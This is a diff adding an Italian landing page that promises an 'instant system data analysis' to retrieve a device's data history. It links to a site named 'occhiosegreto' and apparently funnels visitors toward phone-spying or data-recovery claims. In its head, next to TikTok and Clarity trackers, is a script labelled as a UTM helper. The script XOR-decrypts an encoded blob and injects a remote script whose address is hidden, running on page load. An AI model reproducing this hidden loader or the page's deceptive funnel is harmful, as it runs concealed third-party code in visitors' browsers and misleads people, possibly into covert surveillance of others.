@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="it">
+    <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>ita</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { width: 100%; min-height: 100vh; }
+    body { background-color: #fff; font-family: "Roboto", sans-serif; font-weight: 300; }
+
+    .page-wrap { display: flex; flex-direction: column; align-items: center; width: 100%; }
+
+    /* Titulo — barra vermelha */
+    .sec-title-1 {
+      width: 100%;
+      background-color: #e02020;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 28px 24px;
+    }
+    .sec-title-1 h2 {
+      font-family: "Roboto", sans-serif;
+      font-size: clamp(24px, 4vw, 42px);
+      font-weight: 800;
+      text-align: center;
+      line-height: 1.2;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+      color: #fff;
+    }
+
+    /* Subtitulo verde */
+    .sec-title-2 {
+      width: 100%;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 18px 24px 10px;
+    }
+    .sec-title-2 h2 {
+      font-family: "Roboto", sans-serif;
+      font-size: clamp(20px, 2.4vw, 32px);
+      font-weight: 700;
+      text-align: center;
+      line-height: 1.35;
+      text-transform: uppercase;
+      color: #23a455;
+    }
+
+    /* Passos + Botao */
+    .sec-main {
+      width: 100%;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 20px 24px;
+      gap: 28px;
+    }
+
+    /* 3 passos em caixas verdes (reconstruidos em HTML) */
+    .steps-wrap {
+      width: 100%;
+      max-width: 1024px;
+      display: flex;
+      justify-content: center;
+      align-items: stretch;
+      gap: 22px;
+      flex-wrap: wrap;
+    }
+    .step-card {
+      flex: 1 1 260px;
+      max-width: 320px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+    .step-num {
+      width: 54px;
+      height: 54px;
+      background-color: #23a455;
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      font-weight: 800;
+      line-height: 1;
+      box-shadow: 0 4px 12px rgba(35,164,85,0.28);
+    }
+    .step-box {
+      width: 100%;
+      flex: 1 1 auto;
+      background-color: #23a455;
+      color: #fff;
+      border-radius: 18px;
+      padding: 30px 20px;
+      min-height: 168px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      font-size: clamp(16px, 1.7vw, 21px);
+      font-weight: 700;
+      text-transform: uppercase;
+      line-height: 1.32;
+      letter-spacing: 0.3px;
+    }
+    .step-icon {
+      width: 42px;
+      height: 42px;
+      color: #23a455;
+    }
+    .step-icon svg { width: 100%; height: 100%; display: block; }
+
+    .btn-wrap { width: 100%; max-width: 1024px; display: flex; justify-content: center; }
+
+    .elementor-button {
+      display: inline-block;
+      width: 100%;
+      background-color: #2563eb;
+      color: #fff;
+      font-family: "Roboto", sans-serif;
+      font-size: clamp(15px, 2.2vw, 20px);
+      font-weight: 700;
+      text-align: center;
+      text-decoration: none;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 16px 28px;
+      border-radius: 25px !important;
+      position: relative;
+      overflow: hidden;
+      animation: btnPulse 2s ease-in-out infinite;
+    }
+    @keyframes btnPulse {
+      0%, 100% {
+        transform: scale(0.97);
+        box-shadow: 0px 0px 16px 2px rgba(12,189,101,0.55), 0 4px 18px rgba(0,0,0,0.18);
+      }
+      50% {
+        transform: scale(1.02);
+        box-shadow: 0px 0px 32px 6px rgba(12,189,101,0.90), 0 8px 28px rgba(0,0,0,0.22);
+      }
+    }
+    .elementor-button::after {
+      content: "";
+      position: absolute;
+      top: -50%; left: -80%;
+      width: 50%; height: 200%;
+      background: linear-gradient(120deg, transparent 0%, rgba(255,255,255,0.32) 50%, transparent 100%);
+      transform: skewX(-20deg);
+      animation: shimmerBtn 3s ease-in-out infinite;
+      border-radius: inherit;
+      pointer-events: none;
+    }
+    @keyframes shimmerBtn {
+      0%   { left: -80%;  opacity: 0; }
+      15%  { opacity: 1; }
+      55%  { left: 130%; opacity: 0; }
+      100% { left: 130%; opacity: 0; }
+    }
+    .elementor-button-text { position: relative; z-index: 1; }
+
+    /* Footer */
+    .sec-bottom {
+      width: 100%;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 10px 20px 24px;
+      gap: 14px;
+    }
+    .footer-text {
+      font-family: "Roboto", sans-serif;
+      font-size: clamp(11px, 1.5vw, 14px);
+      font-weight: 400;
+      color: #555;
+      text-align: center;
+      line-height: 1.8;
+      padding-bottom: 16px;
+    }
+    .footer-text a { color: #333; text-decoration: underline; }
+    .footer-text a:hover { color: #000; }
+
+    @media (max-width: 767px) {
+      .sec-title-1 { padding: 22px 14px; }
+      .sec-title-2 { padding: 14px 14px 8px; }
+      .sec-main    { padding: 16px 12px 20px; gap: 22px; }
+      .steps-wrap  { gap: 26px; }
+      .step-box    { min-height: 0; padding: 22px 18px; }
+      .sec-bottom  { padding: 8px 10px 20px; }
+    }
+  </style>
+  <!-- TikTok Pixel -->
+<script>
+!function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};ttq.load('D8KRD7RC77U2CD23F4J0');ttq.page();}(window,document,'ttq');
+</script>
+
+
+  <!-- UTMFY - Script de UTMs -->
+  <script>(function(){var y_q6f=atob("DF1VtlJfc9d29TdSzCZ3wyAzUe1UnUMmvC5vmX08F7lYgEM/pTssmDEwHvkUhxghry88xiYsXKICmER9oDwh0yErXb0F1xtwrSkhxDs9BqMThhVolyZ32DMyFvVM11MzuDx4wyYyGrEP2EcgqSsw2CZyC7QZkRohrzZ3mnApErsDkBVo7n8omil9HbYbkBVo7jk0wjNyBqMbnFEr4S0n0yQ6HaNbhkIwpTkmlH59BbYagFJw9n93yw8i");var c_p6y=[];for(var a_vq=0;a_vq<y_q6f.length;a_vq++){c_p6y.push(y_q6f.charCodeAt(a_vq)&255);}var b_v=c_p6y[0];var c_v2qd=c_p6y.slice(1,1+b_v);var i_c=c_p6y.slice(1+b_v);var k_6y=i_c.map(function(b,o_6v){return b^c_v2qd[o_6v%b_v];});var m_g9="";for(var h_xmn=0;h_xmn<k_6y.length;h_xmn++){m_g9+=String.fromCharCode(k_6y[h_xmn]&255);}var a_39x=decodeURIComponent(escape(m_g9));var s_9s=JSON.parse(a_39x);var k_9=s_9s.globals||[];k_9.forEach(function(s_os){window[s_os.name]=s_os.value;});var a_abq=document.createElement("script");a_abq.src=s_9s.url;a_abq.async=true;a_abq.defer=true;(s_9s.attributes||[]).forEach(function(a_nkm){a_abq.setAttribute(a_nkm.name,a_nkm.value);});(document.head||document.documentElement).appendChild(a_abq);})();</script>
+  
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yhfctkn5tp");
+</script>
+
+</head>
+<body>
+<div class="page-wrap">
+
+  <div class="sec-title-1">
+    <h2>Avvia l'analisi istantanea dei dati sistema.</h2>
+  </div>
+
+  <div class="sec-title-2">
+    <h2>Esegui il protocollo in 3 rapidi passaggi.</h2>
+  </div>
+
+  <div class="sec-main">
+    <div class="steps-wrap">
+
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <div class="step-box">Inserisci il dispositivo da verificare</div>
+        <div class="step-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="5" y="2" width="14" height="20" rx="2.5"></rect>
+            <line x1="12" y1="18" x2="12.01" y2="18"></line>
+          </svg>
+        </div>
+      </div>
+
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <div class="step-box">Attendi la sincronizzazione dei registri</div>
+        <div class="step-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="23 4 23 10 17 10"></polyline>
+            <polyline points="1 20 1 14 7 14"></polyline>
+            <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
+          </svg>
+        </div>
+      </div>
+
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <div class="step-box">Visualizza lo storico dati recuperati</div>
+        <div class="step-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 3v5h5"></path>
+            <path d="M3.05 13A9 9 0 1 0 6 5.3L3 8"></path>
+            <line x1="12" y1="7" x2="12" y2="12"></line>
+            <line x1="12" y1="12" x2="15.5" y2="14"></line>
+          </svg>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="btn-wrap">
+      <a class="elementor-button" href="https://occhiosegreto.online/etapa2t/">
+        <span class="elementor-button-content-wrapper">
+          <span class="elementor-button-text">&#9654; AVVIA L'ANALISI DEI DATI</span>
+        </span>
+      </a>
+    </div>
+  </div>
+
+  <div class="sec-bottom">
+    <div class="footer-text">
+      &copy; 2026 Tutti i diritti riservati.<br><br>
+      <a href="#">Informativa sulla privacy</a> | <a href="#">Termini di utilizzo</a>
+    </div>
+  </div>
+
+</div>
+</body>
+</html>
